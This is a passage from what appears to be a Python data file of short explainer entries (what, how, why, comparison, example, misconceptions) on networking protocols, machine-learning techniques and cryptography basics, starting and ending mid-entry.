    "how": "devices generate addresses via SLAAC by combining a router-advertised /64 prefix with a hashed interface identifier. Routing uses simpler headers without fragmentation in transit. Dual-stack hosts run IPv4 and IPv6 in parallel; pure IPv6 networks reach IPv4 destinations via NAT64/DNS64 or 464XLAT",
    "why": "IPv6 ends address scarcity, restores end-to-end connectivity, and removes NAT's complications. Mobile carriers (T-Mobile, Reliance Jio) run IPv6-only cores because it scales better. The IoT explosion of billions of connected devices is only feasible with IPv6's address space",
    "vs": "compared with IPv4 plus NAT, IPv6 simplifies routing, makes peer-to-peer trivial, and removes the need for port translation. The cost is universal dual-stack support during transition; many enterprise networks lag because their internal apps assume IPv4",
    "ex": "an iPhone on T-Mobile gets only an IPv6 address. To reach an IPv4-only website, T-Mobile uses 464XLAT: the phone synthesizes an IPv6 address from the IPv4 destination, the carrier translates back to IPv4 at the edge. The phone never knows IPv4 exists",
    "mis": "people think IPv6 is mostly hex addresses they can't memorize; in practice you don't memorize them, just like you don't memorize IPv4 addresses for most sites. Another myth is that IPv6 is insecure because there's no NAT -- a stateful firewall provides the same filtering NAT did, intentionally",
}
T["TLS handshake"] = {
    "what": "the negotiation process at the start of a TLS connection that authenticates the server (and optionally the client), agrees on a cipher suite, and derives session keys. It happens before any application data flows over HTTPS, IMAPS, SMTPS, etc",
    "how": "TLS 1.3 streamlines to a single round trip: client sends ClientHello with supported ciphers and a keyshare; server responds with ServerHello, certificate, and its keyshare, then derives keys via ECDHE. Both sides verify and switch to encrypted communication. 0-RTT resumption can send data in the very first flight",
    "why": "TLS protects the confidentiality and integrity of internet traffic against eavesdroppers and tampering. Letsencrypt-driven free certificates pushed HTTPS from ~30% of page loads in 2014 to over 95% by the mid-2020s, fundamentally changing the security baseline of the web",
    "vs": "TLS 1.3 cuts the handshake from two round trips to one (or zero with resumption) versus TLS 1.2 and removes weak ciphers entirely. Compared with full handshakes, session resumption (PSK or session tickets) lets reconnecting clients skip key exchange, which is critical for mobile latency",
    "ex": "loading https://example.com over TLS 1.3 from a phone: ClientHello and ServerHello complete in one round trip (~50ms on cellular); HTTP requests follow immediately, encrypted with keys nobody else can derive. Resumption later in the day skips the handshake entirely with 0-RTT",
    "mis": "people think TLS encrypts the entire connection; the SNI (Server Name Indication) historically leaked which site you were visiting. Encrypted Client Hello (ECH) finally fixes this in 2024+. Another myth is that HTTPS is slow -- with TLS 1.3 and modern hardware, the overhead is negligible",
}
T["certificate authorities"] = {
    "what": "trusted third parties that issue digital certificates binding a public key to a domain or organization. Browsers and operating systems ship with a root store of CAs they trust; any certificate signed by them (or by an intermediate they signed) is automatically trusted",
    "how": "a domain owner generates a key pair and a certificate signing request (CSR), proves control of the domain via DNS, HTTP, or email challenge, and receives a signed certificate. Servers present this certificate during TLS handshake. Browsers verify the chain of signatures up to a trusted root and check revocation via OCSP or CRLs",
    "why": "without CAs, you couldn't trust that the server presenting a certificate for example.com is actually example.com -- there would be no way to bootstrap trust on the open internet. Let's Encrypt's free automated CA drove the industry to ubiquitous HTTPS",
    "vs": "compared with self-signed certificates (which work but require manual trust per cert), CA-signed certificates inherit trust from the root store. Compared with a fully decentralized model like the Web of Trust used in PGP, the CA system is hierarchical -- simpler but vulnerable to a single CA's compromise",
    "ex": "Let's Encrypt issues a 90-day certificate after your server proves it can serve a specific token at /.well-known/acme-challenge/<token>. The certbot tool automates renewal so you never expire. The cert is signed by Let's Encrypt's intermediate, which is signed by a trusted root in browsers' stores",
    "mis": "people think CAs verify the identity of the website's owner; standard DV (domain validation) certificates only verify control of the domain, not the legal entity behind it. EV (extended validation) certificates do verify identity but browsers no longer show special UI for them",
}
T["WebSockets vs Server-Sent Events"] = {
    "what": "two browser APIs for streaming data from server to client. WebSockets provide a full-duplex binary or text channel after upgrading an HTTP connection. Server-Sent Events (SSE) provide one-way text streaming over a long-lived HTTP/1.1 response",
    "how": "WebSockets handshake with an HTTP 101 Upgrade and switch the TCP connection to the WS protocol; both sides can send frames at any time. SSE is just an HTTP response with content-type text/event-stream that the server keeps writing to; the browser's EventSource API parses the stream",
    "why": "real-time features -- chat, dashboards, notifications, collaborative editing -- need server push. Choosing the right primitive affects performance, complexity, and infrastructure compatibility (load balancers, proxies, mobile networks)",
    "vs": "WebSockets are full-duplex and great for chat and games where the client also pushes. SSE is one-way and simpler -- it reuses HTTP, supports automatic reconnection with the Last-Event-ID header, and works through standard HTTP infrastructure. SSE is easier to operate; WebSockets are more powerful",
    "ex": "a stock ticker uses SSE to push prices to thousands of viewers -- one-way stream, automatic reconnect, no special infrastructure. A multiplayer game uses WebSockets so clients can send inputs and the server broadcasts state, all over one connection with low overhead",
    "mis": "people use WebSockets reflexively for any real-time feature; SSE often suffices and is simpler. Another myth is that WebSockets keep TCP connections forever; mobile networks and proxies often kill idle connections within minutes, so apps need ping/pong heartbeats",
}
T["WebRTC"] = {
    "what": "Web Real-Time Communications, a browser API and protocol stack for peer-to-peer audio, video, and data between browsers without intermediate servers. Built into every major browser, it powers Zoom-like calling, Discord voice, and live-streaming platforms",
    "how": "two peers exchange SDP offers and answers (signaling) and ICE candidates over a server you provide, then establish a direct DTLS-encrypted connection. NAT traversal uses STUN to discover public addresses; if direct fails, TURN relays the media through a server. Audio/video flows over RTP, data over the SCTP-based DataChannel",
    "why": "WebRTC eliminates the need for a media server in many use cases, dramatically cutting bandwidth costs and reducing latency. It's why browser-based video calling feels native, and why apps like Discord can run voice for tens of millions of users with manageable infrastructure",
    "vs": "compared with WebSockets, WebRTC adds peer-to-peer transport, NAT traversal, and built-in media codecs. Compared with HLS/DASH streaming, WebRTC is sub-second latency and bidirectional, while HLS is one-way and several seconds delayed",
    "ex": "Google Meet uses WebRTC. When you join a small call, peers connect directly; for larger calls, traffic flows through Google's selective forwarding units (SFUs) that mix and route streams. The browser handles encoding (VP9, AV1), encryption (DTLS-SRTP), and adaptive bitrate over a single API",
    "mis": "people think WebRTC is purely peer-to-peer; in practice, large calls always use SFUs or MCUs to scale beyond a few participants. Another myth is that WebRTC handles signaling itself -- the spec deliberately leaves signaling to the application, which is why every WebRTC app needs its own signaling server",
}
T["VPN protocols (IPsec, WireGuard)"] = {
    "what": "VPN protocols establish encrypted tunnels between endpoints across an untrusted network. IPsec is a heavyweight 1990s suite operating at L3 with strong enterprise features. WireGuard is a 2018 minimalist design (~4000 LOC) using modern cryptography and a stateless protocol",
    "how": "IPsec uses IKE for key exchange, then encapsulates packets with ESP for confidentiality and integrity. WireGuard uses a single Noise-IK handshake based on Curve25519, ChaCha20-Poly1305, and BLAKE2s, then sends encrypted UDP packets keyed by short, fast-rotating session keys",
    "why": "VPNs protect employees on hotel Wi-Fi, connect data centers, and let remote workers reach internal services. WireGuard's simplicity means it audits cleanly, performs better than IPsec on most hardware, and integrates with kernel mainline (Linux 5.6+)",
    "vs": "IPsec has decades of enterprise integration (smart cards, complex policies) but is notoriously hard to configure and debug. WireGuard offers a smaller attack surface, faster handshakes (sub-millisecond), better mobile roaming (peer survives IP changes), but lacks IPsec's policy richness",
    "ex": "Mullvad, Tailscale, and ProtonVPN all use WireGuard for client connections because the handshake completes in a single round trip and the kernel implementation is faster than userspace OpenVPN. Tailscale layers a coordination plane on top so devices automatically discover and tunnel between each other",
    "mis": "people equate VPN with privacy; a VPN protects against your local network and ISP, but the VPN provider then sees your unencrypted traffic. Another myth is that WireGuard lacks features compared to IPsec -- for typical site-to-site and remote-access use cases, WireGuard is feature-complete and far simpler",
}

# === TECH: AI/ML ===
T["supervised vs unsupervised learning"] = {
    "what": "two paradigms in machine learning. Supervised learning trains on labeled data -- (input, target) pairs -- to learn a mapping from input to target. Unsupervised learning works on unlabeled data and discovers structure (clusters, lower-dimensional representations, density)",
    "how": "supervised models minimize a loss between predictions and ground-truth labels via gradient descent: classification uses cross-entropy, regression uses mean-squared error. Unsupervised methods include k-means and DBSCAN for clustering, PCA and t-SNE for dimensionality reduction, autoencoders for compressed representations",
    "why": "supervised learning powers most production ML -- spam detection, recommendation, medical imaging -- because labeled data, when available, gives the strongest signal. Unsupervised learning unlocks insight from the vastly larger pool of unlabeled data: customer segmentation, anomaly detection, and self-supervised pretraining for LLMs",
    "vs": "supervised learning is more accurate when you have labels but expensive to scale because labeling is human work. Unsupervised methods don't need labels but their results are harder to evaluate -- 'is this clustering correct?' is itself ill-defined. Self-supervised learning bridges them by inventing labels from the data itself",
    "ex": "ImageNet classification (predict one of 1000 labels from a photo) is supervised. Customer segmentation that groups shoppers by purchase patterns into clusters with no predefined labels is unsupervised. GPT-4's pretraining is self-supervised: the labels are the next tokens in a corpus, no human annotation needed",
    "mis": "people think more labels always beat unsupervised learning; modern self-supervised pretraining followed by light supervised fine-tuning often beats pure supervised learning by a wide margin. Another myth is that unsupervised methods are easier -- evaluating them is often harder than evaluating supervised models",
}
T["neural network backpropagation"] = {
    "what": "the algorithm that computes gradients of the loss with respect to every parameter in a neural network by applying the chain rule of calculus backward through the network. It enables training deep networks via gradient descent",
    "how": "the forward pass computes activations layer by layer and the loss at the output. The backward pass walks layers in reverse, computing the gradient of the loss with respect to each layer's inputs and parameters using the chain rule. Frameworks like PyTorch and JAX automate this with reverse-mode automatic differentiation",
    "why": "without backprop, training networks beyond a few layers would require numerical differentiation that scales poorly. Backprop computes all gradients in time proportional to the forward pass, making it possible to train networks with billions of parameters. It is the engine behind every modern deep learning system",
    "vs": "compared with finite differences (which estimate gradients by perturbing each weight), backprop is exponentially faster -- O(parameters) versus O(parameters^2). Compared with forward-mode autodiff, backprop is more efficient when outputs are scalar (loss) and inputs are many (parameters), which describes essentially all of deep learning",
    "ex": "training a small classifier: forward pass turns a 784-pixel image into a 10-class probability vector. The cross-entropy loss compares to the true label. Backprop walks back through the softmax, the linear layer, the activations, and the previous linear layer, computing gradients that an optimizer like Adam uses to update weights",
    "mis": "people think backprop is mysterious AI magic; it is mechanical application of the chain rule. Another myth is that vanishing gradients make deep nets impossible -- batch normalization, residual connections, and careful initialization (He, Xavier) solved that years ago",
}
T["convolutional neural networks"] = {
    "what": "a class of neural networks that apply learned convolutional filters across an input (typically images), exploiting local structure and translation invariance. CNNs dominated computer vision from 2012 (AlexNet) through the late 2010s and remain a strong baseline",
    "how": "convolutional layers slide small filters (3x3 or 5x5) across the input, producing feature maps that encode local patterns. Stacked layers learn hierarchical features: edges, then textures, then parts, then objects. Pooling layers downsample for translation invariance; fully connected layers at the end produce class scores",
    "why": "CNNs revolutionized vision because they bake in priors that suit images: local connectivity, weight sharing across spatial positions, hierarchical composition. AlexNet's 2012 ImageNet win cut the error rate by 10 points and triggered the deep learning boom. They power modern face recognition, medical imaging, and autonomous driving perception",
    "vs": "compared with fully connected networks, CNNs have far fewer parameters per layer (a 3x3 filter vs a dense 224x224 weight matrix) and generalize better to images. Compared with vision transformers (ViT), CNNs have stronger inductive biases and need less data; ViTs match or beat them when trained on enormous datasets",
    "ex": "a typical ImageNet classifier like ResNet-50 stacks ~50 convolutional layers with residual connections. The first conv learns edge filters; deeper convs learn textures (fur, brick); the final layers respond to whole objects (golden retrievers, beagles). Total parameters: ~25M, far fewer than a dense network of equivalent depth",
    "mis": "people think CNNs are obsolete due to transformers; for many real applications -- medical imaging with limited data, edge inference -- CNNs remain the practical choice. Another myth is that CNNs 'see' like humans; they latch onto texture and frequency patterns in ways that fool them with adversarial examples",
}
T["recurrent neural networks"] = {
    "what": "neural networks that process sequences by maintaining a hidden state that updates with each input. RNNs were the dominant sequence model from the 1990s through ~2017, including LSTM and GRU variants designed to handle long-range dependencies",
    "how": "at each time step, the RNN takes the current input and the previous hidden state, computes a new hidden state via a learned transformation, and optionally produces an output. Backpropagation Through Time unrolls the network across time steps and applies standard backprop. LSTMs add gating (forget, input, output gates) to control information flow over long sequences",
    "why": "RNNs introduced sequence modeling to deep learning, enabling early speech recognition, machine translation, and language modeling. LSTMs in particular solved the vanishing gradient problem enough to handle dependencies spanning hundreds of time steps and powered Google Translate's 2016 neural overhaul",
    "vs": "compared with transformers, RNNs are inherently sequential -- they can't parallelize across time steps -- which makes training on long sequences slow. Transformers process all positions in parallel via attention. RNNs still have niches where streaming inference matters: real-time speech, on-device sequence models",
    "ex": "an LSTM language model takes a sequence of word embeddings and updates a 512-dimensional hidden state at each step. After processing 'the cat sat on the', the hidden state encodes enough context that a softmax over the vocabulary assigns high probability to 'mat' or 'floor'. State-of-the-art LMs in 2017 (before transformers) used this exact pattern",
    "mis": "people think RNNs are obsolete; they remain useful for streaming applications and resource-constrained devices. Another myth is that LSTM 'memory cells' literally store values verbatim -- they store learned representations that the gates modulate over time",
}
T["transformer architecture"] = {
    "what": "the neural network architecture introduced in the 2017 'Attention is All You Need' paper. It replaces recurrence with self-attention, allowing every position in a sequence to attend to every other position in parallel. Transformers underpin every modern large language model and many vision and audio models",
    "how": "input tokens are embedded and combined with positional encodings. Each transformer block runs multi-head self-attention (each head computes weighted sums of values based on query-key similarity), followed by a position-wise feed-forward network, with residual connections and layer normalization. Stacking dozens of blocks builds the depth that powers GPT-style models",
    "why": "transformers are the architecture that scaled. GPT-4, Claude, Gemini, and Llama all use them because attention is parallelizable across positions, fits modern GPU hardware, and the architecture's quality keeps improving with scale -- the 'scaling laws' Anthropic and OpenAI documented",
    "vs": "compared with RNNs, transformers process the whole sequence in parallel and don't suffer from vanishing gradients across time. The cost is O(n^2) attention complexity in sequence length, which spawned a sub-field of efficient variants -- Linear, Performer, FlashAttention, sparse attention",
    "ex": "GPT-style models stack dozens of decoder-only transformer blocks. The hidden state at each position attends to all earlier positions through causal masking. Llama-3-70B uses 80 layers, 64 attention heads per layer, 8192 hidden dim, ~70B parameters total. Same blueprint as 2017, just scaled massively",
    "mis": "people think transformers 'understand' language; they predict tokens with statistical fidelity that often resembles understanding but breaks in surprising ways. Another myth is that attention is the only thing that matters -- the feed-forward layers (which are roughly two-thirds of the parameters) do most of the heavy lifting on facts and reasoning",
}
T["attention mechanisms"] = {
    "what": "a neural network mechanism that computes a weighted sum of value vectors, where the weights come from learned similarity between query and key vectors. Attention lets the model focus on different parts of the input dynamically rather than encoding everything in a fixed hidden state",
    "how": "for each position, compute Q, K, V vectors from input via learned linear projections. Compute attention weights as softmax(Q @ K.T / sqrt(d)), then output the weighted sum of V. Multi-head attention runs several attention computations in parallel with different projections and concatenates the results",
    "why": "attention solved the bottleneck of fixed-size hidden states in encoder-decoder models -- the model can re-look at any input position when producing each output. It scales beautifully and is the building block of every modern foundation model",
    "vs": "compared with convolution (fixed receptive field, shared filter weights), attention has a global receptive field per layer and content-dependent weights. Compared with recurrence (sequential), attention is parallel. The cost is O(n^2) compute and memory in sequence length, mitigated by FlashAttention and various sparse variants",
    "ex": "in machine translation, when generating the German word 'Sie' the attention head might assign high weight to 'you' in the English source. Visualizing attention shows which input tokens drove each output -- though interpretability is more nuanced than these heatmaps suggest",
    "mis": "people think attention weights tell you what the model is 'thinking' or which inputs were 'used'; attention is one signal among many and gradient-based interpretation often disagrees. Another myth is that all attention heads learn meaningful patterns -- many are redundant or near-noise, which is why models can be pruned",
}
T["transfer learning"] = {
    "what": "training a model on one task or domain (typically with abundant data), then adapting it to a related task with limited data. The pretrained model encodes general representations that transfer; fine-tuning specializes them. It is the dominant paradigm in modern NLP and vision",
    "how": "you start from a checkpoint pretrained on a large dataset (ImageNet for vision, web text for LLMs) and either fine-tune all parameters with a small learning rate, or freeze most layers and train only a head or adapter. Newer methods like LoRA fine-tune low-rank decompositions of the weight matrices, slashing memory",
    "why": "transfer learning is why a startup with 10,000 labeled examples can beat a 2010-era model trained from scratch on the same data. It democratized SOTA performance, since the heavy lifting happened upstream during pretraining. It also reduces compute and data requirements by orders of magnitude",
    "vs": "compared with training from scratch, transfer learning needs far less labeled data and reaches better accuracy. Compared with pure pretraining, fine-tuning specializes for a downstream task. Few-shot prompting of LLMs is a related idea -- the model 'transfers' to your task via in-context examples without weight updates",
    "ex": "fine-tuning Llama-3-8B for legal-document classification: collect 5000 labeled documents, run LoRA fine-tuning for a few hours on a single A100, achieve accuracy comparable to a from-scratch BERT-large on 100x more data. The pretrained representations carry the linguistic load",
    "mis": "people think transfer always works; transferring to a domain very different from pretraining (proteins, chip design) often needs domain-specific pretraining first. Another myth is that fine-tuning destroys the original model's knowledge -- catastrophic forgetting is real but mitigated by techniques like elastic weight consolidation and LoRA",
}
T["reinforcement learning"] = {
    "what": "a paradigm where an agent learns to take actions in an environment to maximize cumulative reward. It is distinct from supervised learning because there are no labeled correct actions -- only delayed reward signals from interaction with the environment",
    "how": "the agent observes a state, picks an action via a policy, receives a reward, and transitions to a new state. Algorithms like Q-learning and Policy Gradient (REINFORCE, PPO) update the policy or value function to favor actions that led to high cumulative reward. Modern deep RL uses neural networks to approximate the policy or value function",
    "why": "RL excels where supervision is hard but reward is well-defined: games, robotics, recommendation, ad bidding, and most recently RLHF for fine-tuning LLMs to be helpful and harmless. AlphaGo, OpenAI Five, and ChatGPT's instruction-following all rest on RL",
    "vs": "compared with supervised learning, RL handles delayed rewards and sequential decision-making but is far harder to train -- credit assignment, exploration-exploitation, and unstable optimization. Compared with imitation learning, RL doesn't need expert demonstrations but needs lots of environment interaction",
    "ex": "AlphaZero learned chess and Go to superhuman level by self-play guided by a single RL signal: did this game lead to a win? Starting from random, after millions of self-play games, it discovered strategies that surprised top human players. No human-game training data was used at all",
    "mis": "people think RL is the path to AGI; in practice it is sample-inefficient and unstable, and most production ML still uses supervised methods. Another myth is that 'reward hacking' is rare -- agents reliably exploit specification gaps in clever ways, which is why reward design is a serious sub-discipline",
}
T["gradient descent variants"] = {
    "what": "optimization algorithms that iteratively update model parameters in the direction of the negative gradient of the loss. Variants -- SGD with momentum, Adam, AdamW, Adafactor, Lion -- differ in how they estimate the gradient, scale per-parameter updates, and apply weight decay",
    "how": "vanilla SGD uses theta := theta - lr * grad. Momentum adds a moving average of past gradients to smooth oscillation. Adam tracks per-parameter first and second moment estimates, normalizing each parameter's update by its variance. AdamW decouples weight decay from the gradient step, fixing a subtle bug in original Adam",
    "why": "the optimizer determines whether a deep network trains successfully and how fast. Adam's per-parameter learning rate adaptation made it the default for transformers and is a major reason LLMs train at all. Lion (2023) showed that simpler updates can match Adam with less memory",
    "vs": "SGD generalizes better than Adam on classic vision tasks (ResNet on ImageNet) due to implicit regularization. Adam is essentially mandatory for transformers because the loss landscape has wildly varying curvature per parameter. AdamW fixes Adam's weight-decay interaction; modern training uses AdamW by default",
    "ex": "Llama-3 was pretrained with AdamW and a cosine learning rate schedule with warmup. Each gradient update averages gradients across tens of thousands of GPUs via all-reduce, scales them by Adam's second-moment estimate, and applies decoupled weight decay -- all standard practice for foundation models in 2024-2026",
    "mis": "people think Adam always converges to a better minimum; on convex problems and some convolutional vision tasks, SGD with momentum beats it. Another myth is that you should always use the highest learning rate that doesn't diverge -- modern recipes use warmup and cosine decay, which beats constant high LRs",
}
T["overfitting and regularization"] = {
    "what": "overfitting is when a model memorizes the training set rather than learning general patterns, achieving low training loss but poor test performance. Regularization is the suite of techniques -- L2, dropout, data augmentation, early stopping, weight decay -- that prevents this",
    "how": "overfitting happens when the model has enough capacity to memorize training data but not enough data to constrain its parameters. Regularization adds penalties (L2 on weight magnitudes), randomness (dropout disabling neurons), or constraints (data augmentation creating new training examples) that bias the model toward simpler solutions that generalize",
    "why": "without regularization, deep networks would just memorize their training data and be useless on new inputs. Regularization is what turns 'fit perfectly to my data' into 'predict well on new data'. The right amount of regularization is one of the most consequential hyperparameter choices in any ML project",
    "vs": "L2 (weight decay) shrinks weights toward zero. Dropout randomly zeros out neurons during training to prevent co-adaptation. Data augmentation creates synthetic training examples (rotations, crops, paraphrases). Early stopping halts training when validation loss stops improving. Each tool addresses a different aspect of overfitting",
    "ex": "training a CNN on a small image dataset of 5000 examples without augmentation: training accuracy reaches 100%, test accuracy stalls at 60%. Adding random crops, horizontal flips, and color jitter as augmentation pushes test accuracy to 80% with negligible change to training time -- a free 20-point improvement",
    "mis": "people think more parameters always overfit; modern over-parameterized networks generalize remarkably well thanks to implicit regularization from SGD and architectural choices. Another myth is that perfect training accuracy means overfitting -- a model can fit training data perfectly and still generalize when properly regularized",
}
T["LoRA fine-tuning"] = {
    "what": "Low-Rank Adaptation, a parameter-efficient fine-tuning technique that adds trainable low-rank matrices to frozen pretrained weights. Instead of updating a layer's full W (e.g., 4096 x 4096 = 16M parameters), LoRA learns A (4096 x r) and B (r x 4096) where rank r is typically 8-64",
    "how": "the layer's effective weight becomes W + alpha/r * B @ A, where W stays frozen. Only A and B (a few hundred thousand parameters per layer) are trained, dramatically cutting memory and compute. After training, the LoRA matrices can be merged into W or kept separate as a small ~50MB adapter file",
    "why": "LoRA enables fine-tuning a 70B-parameter LLM on a single consumer GPU (24-48GB) instead of a multi-GPU cluster. It also lets you ship many task-specific adapters (one per use case) rather than copies of the full model, slashing storage and serving costs",
    "vs": "compared with full fine-tuning, LoRA reaches 90-95% of the quality with a fraction of the memory and time. Compared with prompt tuning, LoRA modifies the weights and generalizes better to long-form generation. Compared with prefix tuning, LoRA is simpler and more effective in modern practice",
    "ex": "fine-tuning Llama-3-8B with LoRA rank 16 on a custom dataset: only ~8M trainable parameters (vs 8B), trains on a single A100 in a few hours, produces a 30MB adapter file. At inference, you load the base model once and multiplex many adapters by swapping the small B@A products",
    "mis": "people think higher rank is always better; on most tasks rank 8 or 16 matches rank 256, and over-large ranks can overfit. Another myth is that LoRA is universally as good as full fine-tuning -- on tasks requiring deep knowledge updates (continued pretraining), full fine-tuning still wins",
}
T["quantization for inference"] = {
    "what": "reducing the numerical precision of a neural network's weights and activations from FP32 or FP16 down to INT8, INT4, or even lower. Quantization shrinks model size and accelerates inference while keeping most of the original accuracy",
    "how": "post-training quantization converts a trained FP model to lower precision by computing scale and zero-point factors per layer or per channel. Quantization-aware training simulates quantization during training so the model adapts. INT4 schemes like GPTQ, AWQ, and bitsandbytes-NF4 use clever bit packing and outlier handling to preserve quality at extreme compression",
    "why": "quantization is what makes large models runnable on consumer hardware. Llama-3-70B in FP16 needs 140GB; in INT4 it fits in 40GB and runs on a single A100. It also speeds up inference on CPUs and edge devices via INT8 SIMD instructions, often 2-4x with minimal accuracy loss",
    "vs": "compared with smaller models, quantization keeps the original architecture and broad capabilities, just at lower precision. Compared with distillation (training a small student), quantization has no training cost. INT8 typically loses <1% accuracy; INT4 loses 1-3% on most tasks; INT2 starts to break for many models",
    "ex": "Apple's Neural Engine runs INT8 quantized models on iPhones at multi-TFLOP throughput. Llama.cpp serves quantized GGUF models on consumer Macs and PCs at usable speeds. Hugging Face's bitsandbytes provides plug-and-play 8-bit and 4-bit quantization for transformers, often with one extra config flag",
    "mis": "people think quantization is lossy in a uniformly bad way; per-channel and per-group quantization preserve quality much better than naive per-tensor schemes. Another myth is that you can't fine-tune quantized models; QLoRA does exactly that by combining 4-bit weights with LoRA adapters",
}
T["retrieval-augmented generation"] = {
    "what": "a technique where a generative model retrieves relevant documents from an external knowledge store and conditions on them to produce its answer. RAG keeps the model's parameters frozen while adapting its responses to fresh, domain-specific, or proprietary information",
    "how": "documents are chunked and embedded into vectors stored in a vector database (FAISS, Pinecone, Weaviate). At query time, the user's question is embedded and the top-k nearest chunks are retrieved. The LLM receives the question plus retrieved chunks as context and generates a grounded answer, often citing sources",
    "why": "RAG sidesteps the cost and frequency of fine-tuning to inject knowledge. It supports up-to-date information without retraining, allows source attribution, and dramatically reduces hallucination on factual questions when the corpus actually contains the answer. It powers enterprise chatbots, code assistants, and search-grounded QA",
    "vs": "compared with fine-tuning, RAG is cheaper, faster to update, and provides citations -- but tends to produce shallower synthesis because reasoning happens at inference time in limited context. Compared with long-context windows, RAG is more selective and scales to corpora far larger than any context window",
    "ex": "an internal-docs chatbot embeds 50,000 wiki pages and customer tickets. When an engineer asks 'how do I rotate the database password', the system retrieves the runbook, prepends it to the prompt, and the LLM produces an answer citing the runbook. Updating the runbook updates the answers without retraining",
    "mis": "people think RAG always reduces hallucinations; it only does so when retrieval succeeds and the model trusts the sources. With irrelevant retrievals or context that contradicts itself, RAG can confidently produce wrong answers. Another myth is that bigger top-k is always better -- noisy chunks can dilute focus",
}
T["tokenization in language models"] = {
    "what": "splitting raw text into discrete units (tokens) that the model processes. Modern LLMs use subword tokenization -- BPE (GPT), WordPiece (BERT), SentencePiece (Llama, T5) -- where common sequences become single tokens and rare ones decompose into smaller pieces",
    "how": "BPE starts with byte- or character-level tokens and iteratively merges the most frequent adjacent pairs until the vocabulary reaches a target size (often 32k-256k). At inference, text is segmented greedily or via dynamic programming using the learned merge rules. Each token maps to a learned embedding vector",
    "why": "tokenization choice shapes everything: how much text fits in a context window (in characters), how the model handles rare words and code, multilingual coverage, and even pricing (LLM APIs charge per token). It determines whether 'antidisestablishmentarianism' is one token or twelve",
    "vs": "BPE handles unknown words by decomposition into known subwords. Character-level tokenization avoids OOV issues but produces much longer sequences. Byte-level BPE (GPT-2+) operates on UTF-8 bytes, achieving universal coverage at modest sequence-length cost. SentencePiece is language-agnostic and treats whitespace as a regular character",
    "ex": "GPT-4's tokenizer encodes 'Hello, world!' as roughly 4 tokens. Code tokens vary wildly: 'def factorial(n):' is ~5 tokens. Languages with little training-corpus coverage (e.g., some African languages) often produce 5-10x more tokens per word than English, raising effective costs and shrinking effective context",
    "mis": "people think a token is a word; in English ~1 token = 0.75 words on average, but it varies heavily by content. Another myth is that tokenization is solved -- it leaks meaningful artifacts into model behavior, including counting bugs and the famous 'SolidGoldMagikarp' anomalous tokens that crashed early GPT models",
}
T["embeddings and vector search"] = {
    "what": "embeddings are dense vector representations of items (text, images, audio) where geometrically close vectors mean semantically similar items. Vector search retrieves the nearest embeddings to a query vector, enabling semantic similarity search at scale",
    "how": "an encoder model (sentence-transformers, OpenAI Ada, Cohere embed) maps each item to a vector of typically 384-3072 dimensions. Vectors are indexed by an approximate nearest neighbor (ANN) structure -- HNSW, IVF, ScaNN -- that trades recall for speed. At query time, the query is embedded and the index returns top-k nearest vectors",
    "why": "vector search powers semantic retrieval -- finding documents about 'how to deploy to production' even when they say 'shipping to prod'. It is the backbone of modern RAG systems, recommendation engines, image search (CLIP), code search, and duplicate detection at billion-vector scale",
    "vs": "compared with keyword search (BM25, ElasticSearch), vector search captures meaning and handles synonyms, but is weaker on exact-match queries (product SKUs, error codes). Hybrid search combines both -- BM25 for precision, vectors for recall -- and typically beats either alone",
    "ex": "Spotify embeds songs by audio and listening patterns. Recommending 'songs like this one' is a vector search in that embedding space, returning the nearest 100 tracks in milliseconds across a catalog of ~100M songs. Same primitive powers Pinterest's image-similarity recommendations",
    "mis": "people think more dimensions are always better; quality plateaus and storage cost grows linearly. Another myth is that embeddings are universal -- a sentence-transformer trained on web text underperforms a domain-specific model on legal or biomedical text, so domain matters",
}

# === TECH: security ===
T["public-key cryptography"] = {
    "what": "an asymmetric encryption scheme using two mathematically linked keys: a public key that anyone may know, and a private key kept secret. Data encrypted with one can be decrypted only with the other. RSA, ECDSA, Ed25519, and Curve25519 are common implementations",
    "how": "key pairs derive from hard math problems -- factoring large semiprimes (RSA), the discrete log problem on elliptic curves (ECDSA, Ed25519). To send a private message, encrypt with the recipient's public key; only their private key decrypts it. To prove authorship, sign with your private key; anyone verifies with your public key",
    "why": "public-key crypto solves the chicken-and-egg problem of secret sharing: two strangers can establish a confidential channel without ever meeting. It underpins TLS, SSH, signed software updates, cryptocurrency wallets, and modern identity systems. Without it, the internet's trust model would not exist",
    "vs": "compared with symmetric crypto (AES, ChaCha20), public-key is ~1000x slower and used for small payloads -- typically just to exchange a symmetric session key. The symmetric key then encrypts the bulk data. This hybrid model is what TLS does and is the dominant pattern",
    "ex": "SSH uses Ed25519 key pairs. You generate ssh-keygen -t ed25519, copy the public key to ~/.ssh/authorized_keys on a server, and connect; the server challenges you to sign a random nonce, you sign with the private key, the server verifies with the public key. No passwords are ever sent",
    "mis": "people confuse signing with encryption; they use the same key pair but in opposite directions. Another myth is that quantum computers will break all public-key crypto soon -- timelines are uncertain, and post-quantum standards (ML-KEM, ML-DSA from NIST in 2024) are already deployable",
}
T["symmetric vs asymmetric encryption"] = {
    "what": "two paradigms in cryptography. Symmetric encryption (AES, ChaCha20) uses one shared key for both encrypt and decrypt. Asymmetric encryption (RSA, ECC) uses a key pair -- public to encrypt, private to decrypt -- with no shared secret",
    "how": "symmetric ciphers transform plaintext in fixed-size blocks (AES) or as a stream (ChaCha20) using the secret key. Asymmetric ciphers use mathematical operations (modular exponentiation, elliptic-curve point multiplication) where the inverse requires the private key. In practice, asymmetric establishes a session, symmetric encrypts the data",
    "why": "the two solve complementary problems: symmetric is fast (gigabits per second on modern CPUs with AES-NI), asymmetric solves key distribution. Together they enable TLS, encrypted messaging, signed software, and almost every secure protocol",
    "vs": "symmetric is much faster and uses smaller keys (AES-256 is 32 bytes; equivalent RSA needs 3072+ bits). Asymmetric is the only way two parties without a shared secret can establish one. The hybrid pattern (asymmetric handshake, symmetric bulk encryption) gives both speed and key distribution",
    "ex": "Signal Protocol's session establishment uses asymmetric (X3DH with Ed25519/X25519) to derive a symmetric root key, then ChaCha20-Poly1305 encrypts every message. Each message also rotates the symmetric key (Double Ratchet) for forward secrecy",
    "mis": "people think one is more secure than the other; they target different problems. AES-256 and Ed25519 both provide ~128 bits of practical security. Another myth is that asymmetric is always 'more advanced' -- it is mathematically richer but symmetric crypto is older, faster, and equally secure for its use case",
}
T["hashing vs encryption"] = {
    "what": "hashing maps arbitrary input to a fixed-size digest in a one-way deterministic way; you cannot recover the input from the hash. Encryption transforms data into ciphertext that can be decrypted with a key. They serve different purposes despite both producing scrambled-looking output",
